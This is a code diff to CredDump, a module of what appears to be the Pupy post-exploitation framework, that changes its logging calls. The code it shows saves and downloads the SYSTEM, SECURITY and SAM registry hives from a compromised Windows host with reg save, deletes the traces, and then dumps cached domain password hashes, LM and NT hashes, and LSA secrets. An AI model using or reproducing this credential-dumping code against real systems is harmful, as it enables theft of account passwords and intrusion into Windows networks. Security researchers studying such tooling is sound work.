@@ -51,7 +51,7 @@ class CredDump(PupyModule):
         except Exception:
             pass
         
-        self.info("saving SYSTEM hives in %TEMP%...")
+        self.success("saving SYSTEM hives in %TEMP%...")
         for cmd in ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM /y", "reg save HKLM\\SECURITY %TEMP%/SECURITY /y", "reg save HKLM\\SAM %TEMP%/SAM /y"):
             self.info("running %s..." % cmd)
             self.log(shell_exec(self.client, cmd))
@@ -70,7 +70,7 @@ class CredDump(PupyModule):
         self.success("hives downloaded to %s" % rep)
         
         # Cleanup
-        self.info("cleaning up saves...")
+        self.success("cleaning up saves...")
         try:
             self.client.conn.modules.os.remove(ntpath.join(remote_temp, "SYSTEM"))
             self.client.conn.modules.os.remove(ntpath.join(remote_temp, "SECURITY"))
@@ -98,25 +98,23 @@ class CredDump(PupyModule):
 
 
         # Print the results
-        self.info("dumping cached domain passwords...")
+        self.success("dumping cached domain passwords...")
 
         for (u, d, dn, h) in dump_hashes(sysaddr, secaddr, is_vista):
-            self.log("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
+            self.success("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
                 d.lower(), dn.lower()))
         
-        self.info("dumping LM and NT hashes...")
+        self.success("dumping LM and NT hashes...")
         bootkey = get_bootkey(sysaddr)
         hbootkey = get_hbootkey(samaddr,bootkey)
         for user in get_user_keys(samaddr):
             lmhash, nthash = get_user_hashes(user,hbootkey)
             if not lmhash: lmhash = empty_lm
             if not nthash: nthash = empty_nt
-            self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16),
-                lmhash.encode('hex'), nthash.encode('hex')))
+            self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
         
-        self.info("dumping lsa secrets...")
-        secrets = get_file_secrets(os.path.join(rep, "SYSTEM"),
-            os.path.join(rep, "SECURITY"), is_vista)
+        self.success("dumping lsa secrets...")
+        secrets = get_file_secrets(os.path.join(rep, "SYSTEM"), os.path.join(rep, "SECURITY"), is_vista)
         if not secrets:
             self.error("unable to read LSA secrets, perhaps the hives are corrupted")
             return
